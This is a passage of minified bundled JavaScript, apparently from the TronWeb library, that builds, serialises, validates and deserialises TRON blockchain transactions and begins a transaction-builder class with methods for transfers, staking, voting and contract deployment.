            const D = new Uf.ABI.Entry.Param
              , {indexed: I, name: M, type: C} = F;
            return I === !0 && D.setIndexed(!0),
            D.setName(M),
            D.setType(C),
            D
        }
          , O = E.map(F => {
            const {anonymous: D, constant: I, name: M, inputs: C, outputs: W, type: k, payable: H, stateMutability: X} = F
              , Y = new Uf.ABI.Entry;
            return Y.setAnonymous(D),
            Y.setConstant(I),
            Y.setName(M),
            C && Y.setInputsList(C.map(V => P(V))),
            W && Y.setOutputsList(W.map(V => P(V))),
            k && Y.setType(Uf.ABI.Entry.EntryType[k.toUpperCase()]),
            Y.setPayable(H),
            X && Y.setStatemutability(Uf.ABI.Entry.StateMutabilityType[X.toUpperCase()]),
            Y
        }
        );
        B.setEntrysList(O),
        x.setAbi(B)
    }
    if (f && x.setCallValue(f),
    x.setConsumeUserResourcePercent(i),
    x.setOriginEnergyLimit(n),
    v || (v = o),
    x.setOriginAddress(Rt(v)),
    a) {
        const E = a.replace(/^0x/, "") + l.replace(/^0x/, "");
        x.setBytecode(nn(E))
    }
    return x.setName(b),
    T.setNewContract(x),
    dr(T, rr.Contract.ContractType.CREATESMARTCONTRACT, "CreateSmartContract", e.Permission_id)
}
  , Eye = (r, e) => {
    const {contract_address: t, owner_address: o} = r
      , i = new jge;
    return i.setOwnerAddress(Rt(o)),
    i.setContractAddress(Rt(t)),
    dr(i, rr.Contract.ContractType.CLEARABICONTRACT, "ClearABIContract", e.Permission_id)
}
  , Aye = (r, e) => {
    const {brokerage: t, owner_address: o} = r
      , i = new Kge;
    return i.setOwnerAddress(Rt(o)),
    i.setBrokerage(t),
    dr(i, rr.Contract.ContractType.UPDATEBROKERAGECONTRACT, "UpdateBrokerageContract", e.Permission_id)
}
  , Pye = (r, e) => {
    const {owner_address: t, name: o, abbr: i, description: n, url: s, total_supply: a, trx_num: l, num: f, start_time: h, end_time: p, precision: b, free_asset_net_limit: v, public_free_asset_net_limit: T, public_free_asset_net_usage: x=0, public_latest_free_net_time: E=0, vote_score: B=0, frozen_supply: P} = r
      , O = new TW;
    if (O.setOwnerAddress(Rt(t)),
    o && O.setName(nn(o.replace(/^0x/, ""))),
    i && O.setAbbr(nn(i.replace(/^0x/, ""))),
    O.setTotalSupply(a),
    O.setNum(f),
    O.setEndTime(p),
    O.setStartTime(h),
    O.setTrxNum(l),
    O.setVoteScore(B),
    b && O.setPrecision(b),
    E && O.setPublicLatestFreeNetTime(E),
    n && O.setDescription(nn(n.replace(/^0x/, ""))),
    s && O.setUrl(nn(s.replace(/^0x/, ""))),
    O.setPublicFreeAssetNetUsage(x),
    O.setFreeAssetNetLimit(v),
    O.setPublicFreeAssetNetLimit(T),
    P) {
        const F = new TW.FrozenSupply;
        F.setFrozenAmount(P.length ? P[0].frozen_amount : P.frozen_amount),
        F.setFrozenDays(P.length ? P[0].frozen_days : P.frozen_days),
        O.addFrozenSupply(F)
    }
    return dr(O, rr.Contract.ContractType.ASSETISSUECONTRACT, "AssetIssueContract", e.Permission_id)
}
  , Cye = (r, e) => {
    const t = new Zge
      , {account_address: o, owner_address: i} = r;
    return t.setOwnerAddress(Rt(i)),
    t.setAccountAddress(Rt(o.replace(/^0x/, ""))),
    dr(t, rr.Contract.ContractType.ACCOUNTCREATECONTRACT, "AccountCreateContract", e.Permission_id)
}
  , Sye = (r, e) => {
    const t = new Yge
      , {account_name: o, owner_address: i} = r;
    return t.setOwnerAddress(Rt(i)),
    t.setAccountName(nn(o.replace(/^0x/, ""))),
    dr(t, rr.Contract.ContractType.ACCOUNTUPDATECONTRACT, "AccountUpdateContract", e.Permission_id)
}
  , Bye = (r, e) => {
    const t = new Xge
      , {account_id: o, owner_address: i} = r;
    return t.setOwnerAddress(Rt(i)),
    t.setAccountId(nn(o.replace(/^0x/, ""))),
    dr(t, rr.Contract.ContractType.SETACCOUNTIDCONTRACT, "SetAccountIdContract", e.Permission_id)
}
  , _ye = (r, e) => {
    const t = new Qge
      , {owner_address: o, parameters: i} = r;
    return t.setOwnerAddress(Rt(o)),
    i.forEach(n => {
        t.getParametersMap().set(n.key, n.value)
    }
    ),
    dr(t, rr.Contract.ContractType.PROPOSALCREATECONTRACT, "ProposalCreateContract", e.Permission_id)
}
  , Iye = (r, e) => {
    const t = new eye
      , {owner_address: o, proposal_id: i} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setProposalId(i),
    dr(t, rr.Contract.ContractType.PROPOSALDELETECONTRACT, "ProposalDeleteContract", e.Permission_id)
}
  , Oye = (r, e) => {
    const t = new tye
      , {owner_address: o, proposal_id: i, is_add_approval: n} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setProposalId(i),
    t.setIsAddApproval(n),
    dr(t, rr.Contract.ContractType.PROPOSALAPPROVECONTRACT, "ProposalApproveContract", e.Permission_id)
}
  , Rye = (r, e) => {
    const t = new rye
      , {owner_address: o, first_token_id: i, first_token_balance: n, second_token_id: s, second_token_balance: a} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setFirstTokenId(mu(i, e.visible)),
    t.setFirstTokenBalance(n),
    t.setSecondTokenId(mu(s, e.visible)),
    t.setSecondTokenBalance(a),
    dr(t, rr.Contract.ContractType.EXCHANGECREATECONTRACT, "ExchangeCreateContract", e.Permission_id)
}
  , Wye = (r, e) => {
    const t = new nye
      , {owner_address: o, exchange_id: i, token_id: n, quant: s} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setExchangeId(i),
    t.setTokenId(mu(n, e.visible)),
    t.setQuant(s),
    dr(t, rr.Contract.ContractType.EXCHANGEINJECTCONTRACT, "ExchangeInjectContract", e.Permission_id)
}
  , Mye = (r, e) => {
    const t = new oye
      , {owner_address: o, exchange_id: i, token_id: n, quant: s} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setExchangeId(i),
    t.setTokenId(mu(n, e.visible)),
    t.setQuant(s),
    dr(t, rr.Contract.ContractType.EXCHANGEWITHDRAWCONTRACT, "ExchangeWithdrawContract", e.Permission_id)
}
  , Nye = (r, e) => {
    const t = new iye
      , {owner_address: o, exchange_id: i, token_id: n, quant: s, expected: a} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setExchangeId(i),
    t.setTokenId(mu(n, e.visible)),
    t.setQuant(s),
    t.setExpected(a),
    dr(t, rr.Contract.ContractType.EXCHANGETRANSACTIONCONTRACT, "ExchangeTransactionContract", e.Permission_id)
}
  , Dye = (r, e) => {
    const t = new Vge
      , {owner_address: o, contract_address: i, consume_user_resource_percent: n} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setContractAddress(Rt(i)),
    t.setConsumeUserResourcePercent(n),
    dr(t, rr.Contract.ContractType.UPDATESETTINGCONTRACT, "UpdateSettingContract", e.Permission_id)
}
  , Fye = (r, e) => {
    const t = new qge
      , {owner_address: o, contract_address: i, origin_energy_limit: n} = r;
    return t.setOwnerAddress(Rt(o)),
    t.setContractAddress(Rt(i)),
    t.setOriginEnergyLimit(n),
    dr(t, rr.Contract.ContractType.UPDATEENERGYLIMITCONTRACT, "UpdateEnergyLimitContract", e.Permission_id)
}
  , Uye = (r, e) => {
    const t = new Jge
      , {owner_address: o, owner: i, witness: n, actives: s} = r;
    t.setOwnerAddress(Rt(o));
    const a = f => isNaN(f) ? f === "Active" ? 2 : f === "Witness" ? 1 : 0 : f
      , l = f => {
        const h = new Mge
          , {type: p, id: b, permission_name: v, threshold: T, parentId: x, operations: E, keys: B} = f;
        return h.setType(a(p)),
        h.setId(b),
        h.setPermissionName(v),
        h.setThreshold(T),
        x && h.setParentId(x),
        E && h.setOperations(nn(E)),
        B && h.setKeysList(B.map(P => {
            const O = new Nge;
            return O.setAddress(Rt(P.address)),
            O.setWeight(P.weight),
            O
        }
        )),
        h
    }
    ;
    return i && t.setOwner(l(i)),
    n && t.setWitness(l(n)),
    s && (Array.isArray(s) ? t.setActivesList(s.map(f => l(f))) : t.setActivesList([l(s)])),
    dr(t, rr.Contract.ContractType.ACCOUNTPERMISSIONUPDATECONTRACT, "AccountPermissionUpdateContract", e.Permission_id)
}
  , kye = (r, e) => {
    const t = new zge
      , {owner_address: o, description: i, url: n, new_limit: s, new_public_limit: a} = r;
    return t.setOwnerAddress(Rt(o)),
    i && t.setDescription(nn(i.replace(/^0x/, ""))),
    n && t.setUrl(nn(n.replace(/^0x/, ""))),
    s && t.setNewLimit(s),
    a && t.setNewPublicLimit(a),
    dr(t, rr.Contract.ContractType.UPDATEASSETCONTRACT, "UpdateAssetContract", e.Permission_id)
}
  , RU = (r, e, t) => {
    switch (r.type) {
    case "TransferContract":
        return aye(e, t);
    case "TransferAssetContract":
        return cye(e, t);
    case "ParticipateAssetIssueContract":
        return lye(e, t);
    case "TriggerSmartContract":
        return uye(e, t);
    case "FreezeBalanceContract":
        return fye(e, t);
    case "UnfreezeBalanceContract":
        return dye(e, t);
    case "WithdrawBalanceContract":
        return hye(e, t);
    case "FreezeBalanceV2Contract":
        return pye(e, t);
    case "CancelAllUnfreezeV2Contract":
        return gye(e, t);
    case "UnfreezeBalanceV2Contract":
        return yye(e, t);
    case "DelegateResourceContract":
        return bye(e, t);
    case "UnDelegateResourceContract":
        return mye(e, t);
    case "WithdrawExpireUnfreezeContract":
        return xye(e, t);
    case "WitnessCreateContract":
        return wye(e, t);
    case "VoteWitnessContract":
        return vye(e, t);
    case "CreateSmartContract":
        return Tye(e, t);
    case "ClearABIContract":
        return Eye(e, t);
    case "UpdateBrokerageContract":
        return Aye(e, t);
    case "AssetIssueContract":
        return Pye(e, t);
    case "AccountCreateContract":
        return Cye(e, t);
    case "AccountUpdateContract":
        return Sye(e, t);
    case "SetAccountIdContract":
        return Bye(e, t);
    case "ProposalCreateContract":
        return _ye(e, t);
    case "ProposalDeleteContract":
        return Iye(e, t);
    case "ProposalApproveContract":
        return Oye(e, t);
    case "ExchangeCreateContract":
        return Rye(e, t);
    case "ExchangeInjectContract":
        return Wye(e, t);
    case "ExchangeWithdrawContract":
        return Mye(e, t);
    case "ExchangeTransactionContract":
        return Nye(e, t);
    case "UpdateSettingContract":
        return Dye(e, t);
    case "UpdateEnergyLimitContract":
        return Fye(e, t);
    case "AccountPermissionUpdateContract":
        return Uye(e, t);
    case "UpdateAssetContract":
        return kye(e, t)
    }
}
  , P4 = r => {
    const e = r.raw_data
      , t = e.contract[0]
      , o = t.parameter.value
      , i = {
        Permission_id: t.Permission_id,
        visible: r.visible
    }
      , n = RU(t, o, i)
      , s = n.getRawData();
    return s.setRefBlockBytes(nn(e.ref_block_bytes)),
    s.setRefBlockHash(nn(e.ref_block_hash)),
    e.data && s.setData(nn(e.data)),
    e.fee_limit && s.setFeeLimit(e.fee_limit),
    e.expiration && s.setExpiration(e.expiration),
    e.timestamp && s.setTimestamp(e.timestamp),
    n.setRawData(s),
    n
}
  , WU = (r, e={}, t={}) => {
    const o = r.raw_data
      , i = o.contract[0]
      , n = RU(i, e, {
        Permission_id: e == null ? void 0 : e.Permission_id
    })
      , s = n.getRawData();
    return s.setRefBlockBytes(nn(o.ref_block_bytes)),
    s.setRefBlockHash(nn(o.ref_block_hash)),
    t.data && s.setData(nn(t.data.replace(/^0x/, ""))),
    (t.fee_limit || e.fee_limit) && s.setFeeLimit(t.fee_limit || e.fee_limit),
    o.expiration && s.setExpiration(o.expiration),
    o.timestamp && s.setTimestamp(o.timestamp),
    n.setRawData(s),
    n
}
  , MU = (r, e) => {
    const t = e.getRawData().serializeBinary()
      , o = mr(t)
      , i = no(t);
    return o.toLowerCase() === r.raw_data_hex.toLowerCase() && i.replace(/^0x/, "").toLowerCase() === r.txID.replace(/^0x/, "").toLowerCase()
}
  , NU = r => mr(r.getRawData().serializeBinary())
  , Lm = r => {
    const e = P4(r);
    return MU(r, e)
}
  , C4 = (r, e, t) => {
    const o = WU(r, e, t);
    return MU(r, o)
}
  , DU = r => {
    const e = r.getRawData().serializeBinary();
    return no(e)
}
  , Lye = {
    0: "AccountCreateContract",
    1: "TransferContract",
    2: "TransferAssetContract",
    4: "VoteWitnessContract",
    5: "WitnessCreateContract",
    6: "AssetIssueContract",
    9: "ParticipateAssetIssueContract",
    10: "AccountUpdateContract",
    11: "FreezeBalanceContract",
    12: "UnfreezeBalanceContract",
    13: "WithdrawBalanceContract",
    15: "UpdateAssetContract",
    16: "ProposalCreateContract",
    17: "ProposalApproveContract",
    18: "ProposalDeleteContract",
    19: "SetAccountIdContract",
    30: "CreateSmartContract",
    31: "TriggerSmartContract",
    33: "UpdateSettingContract",
    41: "ExchangeCreateContract",
    42: "ExchangeInjectContract",
    43: "ExchangeWithdrawContract",
    44: "ExchangeTransactionContract",
    45: "UpdateEnergyLimitContract",
    46: "AccountPermissionUpdateContract",
    48: "ClearABIContract",
    49: "UpdateBrokerageContract",
    54: "FreezeBalanceV2Contract",
    55: "UnfreezeBalanceV2Contract",
    56: "WithdrawExpireUnfreezeContract",
    57: "DelegateResourceContract",
    58: "UnDelegateResourceContract",
    59: "CancelAllUnfreezeV2Contract"
}
  , $ye = r => r.getAuthsList().map(t => {
    const o = mr(t.getPermissionName_asU8())
      , i = t.getAccount()
      , n = {
        name: mr(i.getName_asU8()),
        address: mr(i.getAddress_asU8())
    };
    return {
        permission_name: o,
        account: n
    }
}
)
  , Ru = (r, e) => {
    const t = rr.raw.deserializeBinary(bo(e))
      , o = t.getContractList()[0]
      , i = o.getParameter().getValue()
      , n = Lye[o.getType()];
    if (r !== n)
        throw new Error(`type ${r} dismatches with rawDataHex type ${n}`);
    return [{
        contract: [{
            parameter: {
                value: {},
                type_url: o.getParameter().getTypeUrl()
            },
            type: r,
            Permission_id: o.getPermissionId()
        }],
        data: mr(t.getData()),
        fee_limit: t.getFeeLimit(),
        ref_block_bytes: mr(t.getRefBlockBytes_asU8()),
        ref_block_hash: mr(t.getRefBlockHash_asU8()),
        expiration: t.getExpiration(),
        timestamp: t.getTimestamp(),
        scripts: mr(t.getScripts_asU8()),
        auths: $ye(t)
    }, i]
}
  , zye = (r, e) => {
    const [t,o] = Ru(r, e)
      , i = OU.deserializeBinary(o);
    return t.contract[0].parameter.value = {
        owner_address: mr(i.getOwnerAddress_asU8()),
        contract_address: mr(i.getContractAddress_asU8()),
        call_value: i.getCallValue(),
        data: mr(i.getData_asU8()),
        call_token_value: i.getCallTokenValue(),
        token_id: i.getTokenId()
    },
    t
}
  , yx = r => {
    switch (r) {
    case 0:
        return "BANDWIDTH";
    case 1:
        return "ENERGY";
    default:
        return "BANDWIDTH"
    }
}
  , jye = (r, e) => {
    const [t,o] = Ru(r, e)
      , i = PU.deserializeBinary(o);
    return t.contract[0].parameter.value = {
        owner_address: mr(i.getOwnerAddress_asU8()),
        frozen_balance: i.getFrozenBalance(),
        resource: yx(i.getResource())
    },
    t
}
  , qye = (r, e) => {
    const [t,o] = Ru(r, e)
      , i = CU.deserializeBinary(o);
    return t.contract[0].parameter.value = {
        owner_address: mr(i.getOwnerAddress_asU8()),
        unfreeze_balance: i.getUnfreezeBalance(),
        resource: yx(i.getResource())
    },
    t
}
  , Vye = (r, e) => {
    const [t,o] = Ru(r, e)
      , i = SU.deserializeBinary(o);
    return t.contract[0].parameter.value = {
        owner_address: mr(i.getOwnerAddress_asU8())
    },
    t
}
  , Hye = (r, e) => {
    const [t,o] = Ru(r, e)
      , i = _U.deserializeBinary(o);
    return t.contract[0].parameter.value = {
        owner_address: mr(i.getOwnerAddress_asU8()),
        balance: i.getBalance(),
        lock: i.getLock(),
        lock_period: i.getLockPeriod(),
        receiver_address: mr(i.getReceiverAddress_asU8()),
        resource: yx(i.getResource())
    },
    t
}
  , Gye = (r, e) => {
    const [t,o] = Ru(r, e)
      , i = IU.deserializeBinary(o);
    return t.contract[0].parameter.value = {
        owner_address: mr(i.getOwnerAddress_asU8()),
        balance: i.getBalance(),
        receiver_address: mr(i.getReceiverAddress_asU8()),
        resource: yx(i.getResource())
    },
    t
}
  , Kye = (r, e) => {
    const [t,o] = Ru(r, e)
      , i = BU.deserializeBinary(o);
    return t.contract[0].parameter.value = {
        owner_address: mr(i.getOwnerAddress_asU8())
    },
    t
}
  , Zye = (r, e) => {
    if (!e)
        throw new Error("rawDataHex cannot be empty");
    if (!Ou(e))
        throw new Error("rawDataHex is not a valid hex string");
    switch (r) {
    case "TriggerSmartContract":
        return zye(r, e);
    case "FreezeBalanceV2Contract":
        return jye(r, e);
    case "UnfreezeBalanceV2Contract":
        return qye(r, e);
    case "CancelAllUnfreezeV2Contract":
        return Vye(r, e);
    case "DelegateResourceContract":
        return Hye(r, e);
    case "UnDelegateResourceContract":
        return Gye(r, e);
    case "WithdrawExpireUnfreezeContract":
        return Kye(r, e);
    default:
        throw new Error(`trasaction ${r} not supported`)
    }
}
  , Yye = Object.freeze(Object.defineProperty({
    __proto__: null,
    DeserializeTransaction: Zye,
    txCheck: Lm,
    txCheckWithArgs: C4,
    txJsonToPb: P4,
    txJsonToPbWithArgs: WU,
    txPbToRawDataHex: NU,
    txPbToTxID: DU
}, Symbol.toStringTag, {
    value: "Module"
}));
function ao(r) {
    return or.fromUtf8(r).replace(/^0x/, "")
}
function tE(r) {
    return JSON.parse(JSON.stringify(r))
}
function Xye(r, e, t) {
    if (r.Error)
        throw new Error(r.Error);
    if (r.result && r.result.message)
        throw new Error(or.toUtf8(r.result.message));
    if (C4(r, e, t))
        return r;
    throw new Error("Invalid transaction")
}
function Jye(r, e, t) {
    if (r.Error)
        throw new Error(r.Error);
    if (r.result && r.result.message)
        throw new Error(or.toUtf8(r.result.message));
    if (!(t._isConstant || t.estimateEnergy)) {
        if (C4(r.transaction, e, t))
            return r;
        throw new Error("Invalid transaction")
    }
    return r
}
function Qye(r, e) {
    return "41" + ir(Buffer.from(e + r, "hex")).toString().substring(2).slice(24)
}
function ebe(r) {
    return r.request("wallet/getblock", {
        detail: !1
    }, "post").then(e => ({
        ref_block_bytes: e.block_header.raw_data.number.toString(16).slice(-4).padStart(4, "0"),
        ref_block_hash: e.blockID.slice(16, 32),
        expiration: e.block_header.raw_data.timestamp + 60 * 1e3,
        timestamp: e.block_header.raw_data.timestamp
    }))
}
function FU(r={}) {
    if (typeof r.ref_block_bytes > "u" && typeof r.ref_block_hash > "u" && typeof r.expiration > "u" && typeof r.timestamp > "u")
        return !1;
    if (typeof r.ref_block_bytes != "string")
        throw new Error("Invalid ref_block_bytes provided.");
    if (typeof r.ref_block_hash != "string")
        throw new Error("Invalid ref_block_hash provided.");
    if (typeof r.expiration != "number")
        throw new Error("Invalid expiration provided.");
    if (typeof r.timestamp != "number")
        throw new Error("Invalid timestamp provided.");
    return !0
}
async function cr(r, e, t, o, i={}) {
    const n = {
        visible: !1,
        txID: "",
        raw_data_hex: "",
        raw_data: {
            contract: [{
                parameter: {
                    value: t,
                    type_url: `type.googleapis.com/protocol.${e}`
                },
                type: e
            }],
            ...FU(i) ? {} : await ebe(r.fullNode),
            ...i
        }
    };
    o && (n.raw_data.contract[0].Permission_id = o);
    const s = P4(n);
    return n.txID = DU(s).replace(/^0x/, ""),
    n.raw_data_hex = NU(s).toLowerCase(),
    n
}
function ur(r={}) {
    const e = {};
    return FU(r.blockHeader) && (e.ref_block_bytes = r.blockHeader.ref_block_bytes,
    e.ref_block_hash = r.blockHeader.ref_block_hash,
    e.expiration = r.blockHeader.expiration,
    e.timestamp = r.blockHeader.timestamp),
    e
}
class tbe {
    constructor(e) {
        we(this, "tronWeb");
        we(this, "validator");
        if (!e || !(e instanceof or))
            throw new Error("Expected instance of TronWeb");
        this.tronWeb = e,
        this.validator = new TU
    }
    async sendTrx(e, t=0, o=this.tronWeb.defaultAddress.hex, i={}) {
        t = parseInt(t),
        this.validator.notValid([{
            name: "recipient",
            type: "address",
            value: e
        }, {
            name: "origin",
            type: "address",
            value: o
        }, {
            names: ["recipient", "origin"],
            type: "notEqual",
            msg: "Cannot transfer TRX to the same account"
        }, {
            name: "amount",
            type: "integer",
            gt: 0,
            value: t
        }]);
        const n = {
            to_address: gt(e),
            owner_address: gt(o),
            amount: t
        }
          , s = ur(i);
        return cr(this.tronWeb, nr.TransferContract, n, i == null ? void 0 : i.permissionId, s)
    }
    async sendToken(e, t=0, o, i=this.tronWeb.defaultAddress.hex, n={}) {
        t = parseInt(t),
        this.validator.notValid([{
            name: "recipient",
            type: "address",
            value: e
        }, {
            name: "origin",
            type: "address",
            value: i
        }, {
            names: ["recipient", "origin"],
            type: "notEqual",
            msg: "Cannot transfer tokens to the same account"
        }, {
            name: "amount",
            type: "integer",
            gt: 0,
            value: t
        }, {
            name: "token ID",
            type: "tokenId",
            value: o
        }]);
        const s = {
            to_address: gt(e),
            owner_address: gt(i),
            asset_name: ao(o),
            amount: t
        }
          , a = ur(n);
        return cr(this.tronWeb, nr.TransferAssetContract, s, n == null ? void 0 : n.permissionId, a)
    }
    async purchaseToken(e, t, o=0, i=this.tronWeb.defaultAddress.hex, n={}) {
        this.validator.notValid([{
            name: "buyer",
            type: "address",
            value: i
        }, {
            name: "issuer",
            type: "address",
            value: e
        }, {
            names: ["buyer", "issuer"],
            type: "notEqual",
            msg: "Cannot purchase tokens from same account"
        }, {
            name: "amount",
            type: "integer",
            gt: 0,
            value: o
        }, {
            name: "token ID",
            type: "tokenId",
            value: t
        }]);
        const s = {
            to_address: gt(e),
            owner_address: gt(i),
            asset_name: ao(t),
            amount: parseInt(o)
        }
          , a = ur(n);
        return cr(this.tronWeb, nr.ParticipateAssetIssueContract, s, n == null ? void 0 : n.permissionId, a)
    }
    async freezeBalance(e=0, t=3, o="BANDWIDTH", i=this.tronWeb.defaultAddress.hex, n, s={}) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: i
        }, {
            name: "receiver",
            type: "address",
            value: n,
            optional: !0
        }, {
            name: "amount",
            type: "integer",
            gt: 0,
            value: e
        }, {
            name: "duration",
            type: "integer",
            gte: 3,
            value: t
        }, {
            name: "resource",
            type: "resource",
            value: o,
            msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
        }]);
        const a = {
            owner_address: gt(i),
            frozen_balance: parseInt(e),
            frozen_duration: parseInt(String(t))
        };
        o !== "BANDWIDTH" && (a.resource = o),
        co(n) && gt(n) !== gt(i) && (a.receiver_address = gt(n));
        const l = ur(s);
        return cr(this.tronWeb, nr.FreezeBalanceContract, a, s == null ? void 0 : s.permissionId, l)
    }
    async unfreezeBalance(e="BANDWIDTH", t=this.tronWeb.defaultAddress.hex, o, i={}) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: t
        }, {
            name: "receiver",
            type: "address",
            value: o,
            optional: !0
        }, {
            name: "resource",
            type: "resource",
            value: e,
            msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
        }]);
        const n = {
            owner_address: gt(t)
        };
        e !== "BANDWIDTH" && (n.resource = e),
        co(o) && gt(o) !== gt(t) && (n.receiver_address = gt(o));
        const s = ur(i);
        return cr(this.tronWeb, nr.UnfreezeBalanceContract, n, i == null ? void 0 : i.permissionId, s)
    }
    async freezeBalanceV2(e=0, t="BANDWIDTH", o=this.tronWeb.defaultAddress.hex, i={}) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: o
        }, {
            name: "amount",
            type: "integer",
            gt: 0,
            value: e
        }, {
            name: "resource",
            type: "resource",
            value: t,
            msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
        }]);
        const n = {
            owner_address: gt(o),
            frozen_balance: parseInt(e)
        };
        t !== "BANDWIDTH" && (n.resource = t);
        const s = ur(i);
        return cr(this.tronWeb, nr.FreezeBalanceV2Contract, n, i == null ? void 0 : i.permissionId, s)
    }
    async unfreezeBalanceV2(e=0, t="BANDWIDTH", o=this.tronWeb.defaultAddress.hex, i={}) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: o
        }, {
            name: "amount",
            type: "integer",
            gt: 0,
            value: e
        }, {
            name: "resource",
            type: "resource",
            value: t,
            msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
        }]);
        const n = {
            owner_address: gt(o),
            unfreeze_balance: parseInt(e)
        };
        t !== "BANDWIDTH" && (n.resource = t);
        const s = ur(i);
        return cr(this.tronWeb, nr.UnfreezeBalanceV2Contract, n, i == null ? void 0 : i.permissionId, s)
    }
    async cancelUnfreezeBalanceV2(e=this.tronWeb.defaultAddress.hex, t={}) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: e
        }]);
        const o = {
            owner_address: gt(e)
        }
          , i = ur(t);
        return cr(this.tronWeb, nr.CancelAllUnfreezeV2Contract, o, t == null ? void 0 : t.permissionId, i)
    }
    async delegateResource(e=0, t, o="BANDWIDTH", i=this.tronWeb.defaultAddress.hex, n=!1, s, a={}) {
        if (this.validator.notValid([{
            name: "amount",
            type: "integer",
            gt: 0,
            value: e
        }, {
            name: "resource",
            type: "resource",
            value: o,
            msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
        }, {
            name: "receiver",
            type: "address",
            value: t
        }, {
            name: "origin",
            type: "address",
            value: i
        }, {
            name: "lock",
            type: "boolean",
            value: n
        }, {
            name: "lock period",
            type: "integer",
            gte: 0,
            value: s,
            optional: !0
        }]),
        gt(t) === gt(i))
            throw new Error("Receiver address must not be the same as owner address");
        const l = {
            owner_address: gt(i),
            receiver_address: gt(t),
            balance: parseInt(e)
        };
        o !== "BANDWIDTH" && (l.resource = o),
        n && (l.lock = n,
        co(s) && (l.lock_period = s));
        const f = ur(a);
        return cr(this.tronWeb, nr.DelegateResourceContract, l, a == null ? void 0 : a.permissionId, f)
    }
    async undelegateResource(e=0, t, o="BANDWIDTH", i=this.tronWeb.defaultAddress.hex, n={}) {
        if (this.validator.notValid([{
            name: "origin",
            type: "address",
            value: i
        }, {
            name: "receiver",
            type: "address",
            value: t
        }, {
            name: "amount",
            type: "integer",
            gt: 0,
            value: e
        }, {
            name: "resource",
            type: "resource",
            value: o,
            msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
        }]),
        gt(t) === gt(i))
            throw new Error("Receiver address must not be the same as owner address");
        const s = {
            owner_address: gt(i),
            receiver_address: gt(t),
            balance: parseInt(e)
        };
        o !== "BANDWIDTH" && (s.resource = o);
        const a = ur(n);
        return cr(this.tronWeb, nr.UnDelegateResourceContract, s, n == null ? void 0 : n.permissionId, a)
    }
    async withdrawExpireUnfreeze(e=this.tronWeb.defaultAddress.hex, t={}) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: e
        }]);
        const o = {
            owner_address: gt(e)
        }
          , i = ur(t);
        return cr(this.tronWeb, nr.WithdrawExpireUnfreezeContract, o, t == null ? void 0 : t.permissionId, i)
    }
    async withdrawBlockRewards(e=this.tronWeb.defaultAddress.hex, t={}) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: e
        }]);
        const o = {
            owner_address: gt(e)
        }
          , i = ur(t);
        return cr(this.tronWeb, nr.WithdrawBalanceContract, o, t == null ? void 0 : t.permissionId, i)
    }
    async applyForSR(e=this.tronWeb.defaultAddress.hex, t="", o={}) {
        this.validator.notValid([{
            name: "origin",
            type: "address",
            value: e
        }, {
            name: "url",
            type: "url",
            value: t,
            msg: "Invalid url provided"
        }, {
            name: "url",
            type: "string",
            value: t,
            lte: 256,
            msg: "Invalid url provided"
        }]);
        const i = {
            owner_address: gt(e),
            url: ao(t)
        }
          , n = ur(o);
        return cr(this.tronWeb, nr.WitnessCreateContract, i, o == null ? void 0 : o.permissionId, n)
    }
    async vote(e={}, t=this.tronWeb.defaultAddress.hex, o={}) {
        this.validator.notValid([{
            name: "voter",
            type: "address",
            value: t
        }, {
            name: "votes",
            type: "notEmptyObject",
            value: e
        }]);
        const i = Object.entries(e);
        for (const [l,f] of i)
            this.validator.notValid([{
                name: "SR",
                type: "address",
                value: l
            }, {
                name: "vote count",
                type: "integer",
                gt: 0,
                value: f,
                msg: "Invalid vote count provided for SR: " + l
            }]);
        const n = i.map( ([l,f]) => ({
            vote_address: gt(l),
            vote_count: parseInt(f)
        }))
          , s = {
            owner_address: gt(t),
            votes: n
        }
          , a = ur(o);
        return cr(this.tronWeb, nr.VoteWitnessContract, s, o == null ? void 0 : o.permissionId, a)
    }
    async createSmartContract(e={}, t=this.tronWeb.defaultAddress.hex) {
        var W;
        const o = e.feeLimit || this.tronWeb.feeLimit;
        let i = e.userFeePercentage;
        typeof i != "number" && !i && (i = 100);
        const n = e.originEnergyLimit || 1e7
          , s = e.callValue || 0
          , a = e.tokenValue
          , l = e.tokenId || e.token_id;
        let {abi: f} = e;
        const {parameters: h=[]} = e;
        let p = "";
        const {bytecode: b=!1, name: v=""} = e;
        if (f && fo(f))
            try {
                f = JSON.parse(f)
            } catch {
                throw new Error("Invalid options.abi provided")
            }
        const T = f;
        let x = T;
        if (T.entrys && (x = T.entrys),
        !qf(x))
            throw new Error("Invalid options.abi provided");
        const E = x.some(k => k.type === "constructor" && k.stateMutability.toLowerCase() === "payable");
        if (this.validator.notValid([{
            name: "bytecode",
            type: "hex",
            value: b
        }, {
            name: "feeLimit",
            type: "integer",
            value: o,
            gt: 0
        }, {
            name: "callValue",
            type: "integer",
            value: s,
            gte: 0
        }, {
            name: "userFeePercentage",
            type: "integer",
            value: i,
            gte: 0,
            lte: 100
        }, {
            name: "originEnergyLimit",
            type: "integer",
            value: n,
            gte: 0,
            lte: 1e7
        }, {
            name: "parameters",
            type: "array",
            value: h
        }, {
            name: "issuer",
            type: "address",
            value: t
        }, {
            name: "tokenValue",
            type: "integer",
            value: a,
            gte: 0,
            optional: !0
        }, {
            name: "tokenId",
            type: "integer",
            value: l,
            gte: 0,
            optional: !0
        }]),
        !E && (s > 0 || a > 0))
            throw new Error("When contract is not payable, options.callValue and options.tokenValue must be 0");
